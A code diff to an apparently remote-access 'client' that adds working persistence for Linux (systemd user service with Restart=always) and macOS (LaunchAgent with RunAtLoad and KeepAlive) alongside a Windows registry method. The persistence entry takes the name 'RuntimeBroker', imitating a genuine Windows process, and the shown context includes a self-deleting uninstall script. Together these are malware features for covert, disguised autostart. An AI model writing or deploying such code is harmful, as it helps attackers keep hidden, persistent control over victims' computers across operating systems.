@@ -4,15 +4,16 @@ import platform
 import shutil
 import subprocess
 import sys
+import shlex
 
 PERSISTENCE_NAME = "RuntimeBroker"
 
 def _get_script_path() -> str:
-    """Returns the path of the currently running script."""
+    """Returns the path of the currently running script or executable."""
     if getattr(sys, 'frozen', False):
-        return sys.executable
+        return os.path.realpath(sys.executable)
     else:
-        return os.path.realpath(__file__)
+        return os.path.realpath(sys.argv[0])
 
 def _manage_persistence_windows(enable=True) -> str:
     """Manages persistence on Windows using the Registry."""
@@ -45,14 +46,106 @@ def _manage_persistence_windows(enable=True) -> str:
     except Exception as e:
         return f"An unexpected error occurred during Windows persistence: {e}"
 
+def _manage_persistence_linux(enable=True) -> str:
+    """Manages persistence on Linux using a systemd user service."""
+    try:
+        user_config_dir = os.path.expanduser("~/.config/systemd/user")
+        service_path = os.path.join(user_config_dir, f"{PERSISTENCE_NAME}.service")
+
+        if enable:
+            os.makedirs(user_config_dir, exist_ok=True)
+            script_path = _get_script_path()
+            if not getattr(sys, 'frozen', False):
+                exec_command = f"{sys.executable} {shlex.quote(script_path)}"
+            else:
+                exec_command = shlex.quote(script_path)
+
+            service_content = f"""[Unit]
+Description=Runtime Broker Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exec_command}
+Restart=always
+
+[Install]
+WantedBy=default.target
+"""
+            with open(service_path, "w") as f:
+                f.write(service_content)
+
+            subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
+            subprocess.run(["systemctl", "--user", "enable", f"{PERSISTENCE_NAME}.service"], check=True)
+            subprocess.run(["systemctl", "--user", "start", f"{PERSISTENCE_NAME}.service"], check=True)
+            return "Persistence enabled using systemd user service."
+        else:
+            if os.path.exists(service_path):
+                subprocess.run(["systemctl", "--user", "stop", f"{PERSISTENCE_NAME}.service"], check=False)
+                subprocess.run(["systemctl", "--user", "disable", f"{PERSISTENCE_NAME}.service"], check=False)
+                os.remove(service_path)
+                subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
+                return "Persistence removed (systemd user service)."
+            return "Persistence service not found."
+    except Exception as e:
+        return f"Error managing Linux persistence: {e}"
+
+def _manage_persistence_macos(enable=True) -> str:
+    """Manages persistence on macOS using Launch Agents."""
+    try:
+        launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
+        plist_path = os.path.join(launch_agents_dir, f"com.{PERSISTENCE_NAME.lower()}.plist")
+
+        if enable:
+            os.makedirs(launch_agents_dir, exist_ok=True)
+            script_path = _get_script_path()
+            if not getattr(sys, 'frozen', False):
+                exec_args = [sys.executable, script_path]
+            else:
+                exec_args = [script_path]
+
+            args_xml = "\n        ".join(f"<string>{arg}</string>" for arg in exec_args)
+
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.{PERSISTENCE_NAME.lower()}</string>
+    <key>ProgramArguments</key>
+    <array>
+        {args_xml}
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+
+            subprocess.run(["launchctl", "load", plist_path], check=True)
+            return "Persistence enabled using macOS Launch Agent."
+        else:
+            if os.path.exists(plist_path):
+                subprocess.run(["launchctl", "unload", plist_path], check=False)
+                os.remove(plist_path)
+                return "Persistence removed (macOS Launch Agent)."
+            return "Persistence Launch Agent not found."
+    except Exception as e:
+        return f"Error managing macOS persistence: {e}"
+
 def manage_persistence(enable=True) -> str:
     """Manages client persistence across different operating systems."""
     system = platform.system()
     if system == "Windows":
         return _manage_persistence_windows(enable)
-    # In a real-world scenario, you would add implementations for macOS and Linux here.
-    elif system in ["Darwin", "Linux"]:
-        return f"{system} persistence management is not implemented in this version."
+    elif system == "Linux":
+        return _manage_persistence_linux(enable)
+    elif system == "Darwin":
+        return _manage_persistence_macos(enable)
     else:
         return f"Persistence is not supported on this OS: {system}."
 
@@ -88,7 +181,7 @@ rm -- \"$0\"
             with open(script_path, "w") as f:
                 f.write(script_content)
             os.chmod(script_path, 0o755)
-            subprocess.Popen([script_path], shell=True)
+            subprocess.Popen([script_path])
 
         return f"{persistence_msg}\nUninstallation process started. The client will self-destruct shortly."
 
